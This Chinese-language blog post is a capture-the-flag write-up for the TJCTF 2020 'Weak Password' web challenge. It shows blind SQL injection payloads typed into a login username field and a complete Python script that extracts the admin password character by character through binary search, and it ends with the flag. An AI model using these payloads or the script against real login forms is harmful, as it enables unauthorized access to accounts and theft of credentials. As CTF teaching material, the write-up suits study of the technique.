---
title: TJCTF 2020 - Weak Password (Web)
date: 2020-05-29 11:37:12
categories: 
- Security
tags:
- CTF
- TJCTF 2020
- Web Challenge
---

Writeups 搬自 [MacacaHub TJCTF 2020 Writeups](https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/readme.md)

這題雖然叫Weak Password，但我當時遇到真的戳不出來呢 ; w ;

最後賽後隊友提點才知道原來是**Blind SQL injection**，平常我只拿`' or 1=1 -- `戳戳根本是小兒科ww

<!--more-->

## Description

It seems your login bypass skills are now famous! One of my friends has given you a challenge: figure out his password on this [site](https://weak_password.tjctf.org/). He's told me that his username is admin, and that his password is made of up only lowercase letters and numbers. (Wrap the password with tjctf{...})

![](https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/01.png?raw=true)

## Solution

標題同樣為**Weak Password**，T貓盃只有`admin`:`admin`，這裡反而沒有這麼簡單XD

從題目給定`username`為`admin`，以及從`source code`可以看到`SQL語法`以及一些欄位資訊，我們可以猜到這題要用**Blind SQL injection**，一些基本的猜法可以參考[此篇](https://www.twblogs.net/a/5d0d7134bd9eee1ede0450b0)，當然也可以從網頁把`password`每個字元慢慢猜出來，但身為未來工程屍... 還是寫個Code吧 : )

![](https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/02.png?raw=true)

How to Guess ?

透過`SQL injection`並利用登入結果判斷是否成功，想辦法從`username`撈出我們想要的資訊。

{% gp 2-2 %}
![](https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/03.png?raw=true)
![](https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/04.png?raw=true)
{% endgp %}

例如，猜`password`長度：

`admin' and length(password) > 13 -- ` --> success

`admin' and length(password) > 14 -- ` --> fail

`admin' and length(password) = 14 -- ` --> success

可以猜到`password`長度為14。
<br>

又例如，猜`password`第一個字元：

`admin' and unicode(substr(password, 1)) > unicode('a') -- ` --> success

`admin' and unicode(substr(password, 1)) > unicode('b') -- ` --> fail

`admin' and unicode(substr(password, 1)) = unicode('b') -- ` --> success

可以猜到`password`第一個字元為`b`。

<br>
再來就是寫Code了，可以搭配 **Binary search** 加速搜尋~

然後用回傳的request長度判斷結果是否成功。

{% codeblock solve.py lang:python %}
import requests
import string

# Send request and get result
def inject(n, opr, char):
    url = 'https://weak_password.tjctf.org/login'
    payload = {"username": "admin' and unicode(substr(password, {})) \\
    {} unicode('{}')-- ".format(n, opr,char), "password": "123"}
    r = requests.post(url, data=payload)
    return True if len(r.text)==1842 else False #1842:success

res = ""
li = list(string.digits + string.ascii_lowercase)
for i in range(1, 20):
    
    l = 0
    r = len(li) - 1

    # end up binary search if it can't checkout any character
    if inject(i, '>', li[0]) == False:
        print('password: '+res)
        break

    while l <= r:
        mid = (l +(r+1)) // 2
        #print(l, r, mid)
        if inject(i, '=', li[mid]):
            res = res + li[mid]
            break
        elif inject(i, '>', li[mid]):
            l = mid
        elif inject(i, '<', li[mid]):
            r = mid
        else:
            break
    print(res)
{% endcodeblock %}

### Result
<img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/05.png?raw=true" width="500" align="center"/>

> tjctf{blindsqli14519}
